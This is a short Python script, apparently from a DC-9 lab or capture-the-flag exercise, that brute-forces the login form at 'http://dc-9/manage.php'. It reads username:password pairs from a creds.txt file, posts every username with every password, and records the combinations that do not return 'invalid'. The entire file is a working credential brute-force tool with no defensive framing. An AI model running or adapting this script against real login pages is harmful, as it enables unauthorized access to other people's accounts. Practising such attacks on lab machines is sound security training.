#!/usr/bin/env python3
import requests
url="http://dc-9/manage.php"
def login(url, username, password):
	response = requests.post(url, data={
		"username":username,
		"password":password,
		}
	)
	return response.text
usernames = []
passwords = []
valid = []
with open("creds.txt", "r") as credentials:
	for creds in credentials.readlines():
		refined = creds.split(":")
		usernames.append(refined[0])
		passwords.append(refined[1].strip())
counter = 1 
for username in usernames:
	for password in passwords:
		if "invalid" in login(url, username, password):
			print(f"Attempt: {counter:<10} | Tried {username:}:{password:<20}")
			counter +=1
			continue
		else:
			print(f"[+] Login found! \t {username}:{password}")
			valid.append(username +":"+password)
print(f"\n\nThese credentials were found:\n {valid}")